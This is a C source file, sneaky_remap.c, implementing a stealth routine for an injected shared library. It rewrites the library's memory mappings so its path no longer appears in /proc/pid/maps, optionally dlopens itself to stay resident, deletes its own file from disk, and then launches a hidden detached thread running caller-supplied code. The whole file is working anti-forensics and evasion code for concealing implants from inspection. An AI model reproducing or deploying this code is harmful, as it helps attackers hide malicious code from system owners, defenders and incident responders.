/*
 * sneaky_remap.c
 * Sneakily remap this shared object file to avoid being seen in /proc/pid/maps
 * By J. Stuart McMurray
 * Created 20250725
 * Last Modified 20250808
 */

#define _GNU_SOURCE

#include <sys/ioctl.h>
#include <sys/mman.h>

#include <dlfcn.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>

#include "sneaky_remap.h"

/* MAPS_FILE is where we read the currently-mapped memory pages. */
#define MAPS_FILE "/proc/self/maps"

/* VOIDP converts its argument to a void*, for %p. */
#define VOIDP(x) ((void *)(uintptr_t)(x))

/* C is a silly thing. */
#define xstr(s) str(s)
#define str(s) #s

/* Debug-only printing. */
#ifdef SREM_DEBUG
#include <err.h>
#define DPRINTF(...) do {                             \
        fprintf(stderr, __VA_ARGS__); fflush(stderr); \
} while (0)
#define DWARN(...)  warn(__VA_ARGS__)
#define DWARNX(...) warnx(__VA_ARGS__)
#define D_RET_ERRNO(...) do { \
        int saved_errno;      \
        saved_errno = errno;  \
        DWARN(__VA_ARGS__);   \
        errno = saved_errno;  \
        return SREM_RET_ERRNO;   \
} while (0)

#else /* #ifdef SREM_DEBUG */
#define DPRINTF(...)     do {} while (0)
#define DWARN(...)       do {} while (0)
#define DWARNX(...)      do {} while (0)
#define D_RET_ERRNO(...) return SREM_RET_ERRNO
#endif /* #ifdef SREM_DEBUG */

/* struct map holds relevant info about mapped memory. */
struct map {
        char      path[PATH_MAX+1];
        int       prot;
        size_t    length;
        uintptr_t start;
};

static int filter_mapped_files(struct map *maps, int *nmaps, char *path);
static int find_our_path(      struct map *maps, int  nmaps, struct map *pmap);
static int overmap_files(      struct map *maps, int *nmaps);
static int overmap_map(        struct map *map , int  pfd[2]);
static int read_mapped_files(  struct map *maps, int *nmaps);
static int remap_map(          struct map *map , int  pfd[2], uintptr_t mem);

/* sneaky_remap_start shuffles memory around to remove this shared object
 * file's path from /proc/self/maps and then starts start_routine in its own
 * thread. */
int
sneaky_remap_start(void *(start_routine)(void *), void *arg, int flags)
{
        int ret, nmaps;
        struct map maps[SREM_MAX_MAPS];
        struct map pmap;
        pthread_t tid;
        pthread_attr_t attr;

        /* Get a list of mapped files. */
        bzero(maps, sizeof(maps));
        nmaps = 0;
        if (SREM_RET_OK != (ret = read_mapped_files(maps, &nmaps)))
                return ret;

        /* Find our own path. */
        if (SREM_RET_OK != (ret = find_our_path(maps, nmaps, &pmap)))
                return ret;

        /* Filter to the ones which contain us. */
        if (SREM_RET_OK != (ret = filter_mapped_files(maps, &nmaps,
                                        pmap.path)))
                return ret;

        /* Copy the mapped sections to somewhere else, then remap them back. */
        if (SREM_RET_OK != (ret = overmap_files(maps, &nmaps)))
                return ret;

        /* Increase the count of things which have us open, to keep bash from
         * unloading us. */
        if (flags & SREM_SRS_DLOPEN) {
                if (NULL == dlopen(pmap.path, RTLD_NOW)) {
                        DWARNX("dlopen %s: %s", pmap.path, dlerror());
                        return SREM_RET_EDLOPEN;
                } else
                        DPRINTF("dlopen success\n");
        }

        /* Save a potential call to rm(1). */
        if (flags & SREM_SRS_UNLINK) {
                if (-1 == unlink(pmap.path))
                        D_RET_ERRNO("unlink %s", pmap.path);
                else
                        DPRINTF("unlink success (%s)\n", pmap.path);
        }

        DPRINTF("Invisibility cloak active!!!\n");

        /* Start the thread going. */
        if (NULL != start_routine) {
                if (-1 == pthread_attr_init(&attr))
                        D_RET_ERRNO("pthread_attr_init");
                if (-1 == pthread_attr_setdetachstate(&attr,
                                        PTHREAD_CREATE_DETACHED))
                        D_RET_ERRNO("pthread_attr_setdetachstate");
                if (-1 == (ret = pthread_create(&tid, &attr, start_routine,
                                                arg))) {
                        errno = ret;
                        D_RET_ERRNO("pthread_create");
                }
        }

        return SREM_RET_OK;
}

/* read_mapped_files reads the list of mapped files from /proc/self/maps.  maps
 * must have space for at least SREM_MAX_MAPS maps.  The number of maps is
 * returned in nmaps. */
static int
read_mapped_files(struct map *maps, int *nmaps) {
        FILE      *psm;
        char       mode[2], prot[4];
        char      *line;
        int        ret, saved_errno, sret;
        size_t     linesize, pathlen;
        ssize_t    linelen;
        uintptr_t  end;

        ret = SREM_RET_OK;
        saved_errno = 0;

        /* Get hold of /proc/self/maps. */
        mode[0] = 'r';
        mode[1] = 0;
        if (NULL == (psm = fopen(MAPS_FILE, mode)))
                D_RET_ERRNO("open %s", MAPS_FILE);

        /* Read ALL the (file) maps. */
        *nmaps   = -1;
        line     = NULL;
        linesize = 0;
        while (-1 != (linelen = getline(&line, &linesize, psm))) {
                /* Make sure we still have space. */
                if (SREM_MAX_MAPS <= ++(*nmaps)) {
                        DWARNX("%s too big", MAPS_FILE);
                        ret = SREM_RET_TOOMANYMAPS;
                        goto out;
                }
                /* Get the important bits. */
                bzero(&maps[*nmaps], sizeof(maps[*nmaps]));
                sret = sscanf(line,
                                "%lx-%lx %4c %*s %*s %*s %"xstr(PATH_MAX)"[\x01-\xff]",
                                &maps[*nmaps].start,
                                &end,
                                prot,
                                maps[*nmaps].path);
                switch (sret) {
                        case 3: /* Anonymous mapping, don't care. */
                                (*nmaps)--;
                                continue;
                        case 4: /* Good. */
                                break;
                        default: /* Bad line. */
                                DWARNX("invalid maps line: %s", line);
                                ret = SREM_RET_EPARSEMAPS;
                                goto out;
                }
                /* Paths won't end in a newline, so if we don't have one it
                 * means we didn't have enough space for the path. */
                pathlen = strnlen(maps[*nmaps].path, PATH_MAX);
                if (0 == pathlen) {
                        DWARNX("maps line had empty path: %s", line);
                        ret = SREM_RET_EMPTYPATH;
                        goto out;
                } else if ('\n' != maps[*nmaps].path[pathlen-1]) {
                        DWARNX("maps line had path >%d bytes: %s", PATH_MAX,
                                        line);
                        ret = SREM_RET_BIGPATH;
                        goto out;
                }
                maps[*nmaps].path[pathlen-1] = '\0'; /* chomp */

                /* Parse the parts of the line we couldn't just read. */
                maps[*nmaps].prot =
                        (prot[0] == 'r' ? PROT_READ  : 0) |
                        (prot[1] == 'w' ? PROT_WRITE : 0) |
                        (prot[2] == 'x' ? PROT_EXEC  : 0) ;
                maps[*nmaps].length = end - maps[*nmaps].start;
                /* Left commented-out for future debugging. */
                /*
                DPRINTF("Found mapped file: start:%p len:0x%lx prot:0x%x "
                                "path:%s\n",
                                VOIDP(maps[*nmaps].start),
                                maps[*nmaps].length,
                                maps[*nmaps].prot,
                                maps[*nmaps].path);
                */
        }
        if (ferror(psm)) {
                saved_errno = errno;
                DWARN("getline (%s)", MAPS_FILE);
                ret = SREM_RET_ERRNO;
        }

out:
        if (NULL != line) {
                free(line);
                line = NULL;
        }
        if (NULL != psm) {
                fclose(psm);
                psm = NULL;
        }
        errno = saved_errno;
        return ret;
}

/* find_our_path finds the path of the current library which will be copied to
 * nmap.path. */
static int
find_our_path(struct map *maps, int nmaps, struct map *pmap)
{
        int       i;
        uintptr_t addr;

        /* We assume the address of this function is somewhere in one of the
         * pages mapped by the current library and use that to find out what
         * filepath is listed for that page. */
        addr = (uintptr_t)find_our_path;

        /* Search for that address. */
        bzero(pmap->path, sizeof(pmap->path));
        for (i = 0; i < nmaps; ++i) {
                if (maps[i].start <= addr && addr <=
                                (maps[i].start + maps[i].length)) {
                        /* Found it. */
                        strncpy(pmap->path, maps[i].path, sizeof(pmap->path));
                        break;
                }
        }
        if ('\0' == pmap->path[0]) { /* Didn't find it. */
                DWARNX("unable to find path to shared object");
                return SREM_RET_NOPATH;
        }

        return SREM_RET_OK;
}

/* filter_mapped_files removes elements of maps which don't have the given
 * path. */
static int
filter_mapped_files(struct map *maps, int *nmaps, char *path)
{
        int i, next;

        /* Filter down to just the ones with our file. */
        next = 0;
        for (i = 0; i < *nmaps; ++i) {
                /* Don't care if this isn't us. */
                if (0 != strcmp(maps[i].path, path))
                        continue;
                /* Found us.  Copy it to the next unused array element. */
                memmove(&maps[next], &maps[i], sizeof(maps[next]));
                DPRINTF("Map to hide: start:%p len:0x%lx prot:0x%x "
                                "path:%s\n",
                                VOIDP(maps[next].start),
                                maps[next].length,
                                maps[next].prot,
                                maps[next].path);
                /* Use the next one next time. */
                next++;
        }

        /* Update how many maps we care about. */
        *nmaps = next;
        DPRINTF("Found ourselves in %s in %d maps\n", path, *nmaps);

        return SREM_RET_OK;
}

/* overmap_files copies the nmaps maps from maps to another address, then
 * mremaps them back in place. */
static int
overmap_files(struct map *maps, int *nmaps)
{
        int i;
        int pipefd[2];
        int ret;
        int saved_errno;

        /* We'll use this pipe for testing if memory is readable. */
        if (-1 == pipe(pipefd))
                D_RET_ERRNO("pipe");

        /* Remap ALL the maps! */
        ret = SREM_RET_OK;
        for (i = 0; i < *nmaps; ++i) {
                if (SREM_RET_OK != (ret = overmap_map(&maps[i], pipefd)))
                        goto out;
        }

out:
        saved_errno = errno;
        close(pipefd[0]);
        close(pipefd[1]);
        errno = saved_errno;
        return ret;

}

/* overmap_map copies a map to another address, then mremaps it back in
 * place.  pipefd should be a pipe, used for testing memory reads. */
static int
overmap_map(struct map *map, int pfd[2])
{
        int   ret;
        void *p;

        DPRINTF("Remapping 0x%lx bytes for %p...", map->length,
                        VOIDP(map->start));

        /* Make sure we can read this map. */
        if (0 == map->prot)
                if (-1 == mprotect(VOIDP(map->start), map->length,
                                        map->prot|PROT_READ))
                        D_RET_ERRNO("mprotect (add read)");

        /* Grab a chunk of memory. */
        if (MAP_FAILED == (p = mmap(NULL, map->length, PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANON, -1, 0)))
                D_RET_ERRNO("mmap (0x%lx)", map->length);

        /* Copy over each page.  We do this to skip pages we're not
         * going to be able to read. */
        if (SREM_RET_OK != (ret = remap_map(map, pfd, (uintptr_t)p)))
                return ret;

        /* Set permissions to what they should be. */
        if (-1 == mprotect(p, map->length, map->prot))
                D_RET_ERRNO("mprotect (set)");

        /* Remap it back into place and release the old map. */
        if (MAP_FAILED == (mremap(p, map->length, map->length,
                                        MREMAP_MAYMOVE|MREMAP_FIXED,
                                        map->start)))
                D_RET_ERRNO("mremap (%p)", VOIDP(map->start));
        if (-1 == munmap(p, map->length))
                D_RET_ERRNO("munmap (0x%lx)", map->length);

        DPRINTF("ok :)\n");

        return SREM_RET_OK;
}

/* remap_map copies the memory described by map to mem, one page at a
 * time, skipping unreadable pages.  Ecah page is tested by writing to
 * the pipe pfd[1], with a corresponding read from pfd[0] to clear the pipe. */
static int
remap_map(struct map *map, int pfd[2], uintptr_t mem)
{
        int       psz; /* Pagesize. */
        int       ret; /* Returned int. */
        size_t    len; /* Copy length, probably a page. */
        ssize_t   nip; /* Number of bytes in the pipe. */
        uint8_t   buf; /* Pipe drain. */
        uintptr_t dst; /* Per-page copy destination addres. */
        uintptr_t off; /* Per-page copy offset. */
        uintptr_t src; /* Per-page copy source address. */

        psz = getpagesize();

        /* Copy ALL the pages! */
        for (off = 0; off < map->length; off += psz) {
                /* Work out where we're copying. */
                src = map->start + off;
                dst = mem + off;

                /* Work out how much to copy. */
                len = psz;
                if ((src + len) > (map->start + map->length)) {
                        len = (map->start + map->length) - src;
                }

                /* See if this page is readable. */
                ret = 0;
                if (-1 == (nip = write(pfd[1], (uint8_t *)src, 1))) {
                        if (EFAULT != errno) /* A real error. */
                                D_RET_ERRNO("write");
                        continue;
                }
                /* Remove our read-checking byte. */
                if (-1 == (ret = read(pfd[0], &buf, nip)) || 0 == ret)
                        D_RET_ERRNO("read");

                /* Copy the page.  The rest of this function's entire existence
                 * is to ensure this one line works. */
                memcpy(VOIDP(dst), VOIDP(src), len);
        }

        return SREM_RET_OK;
}
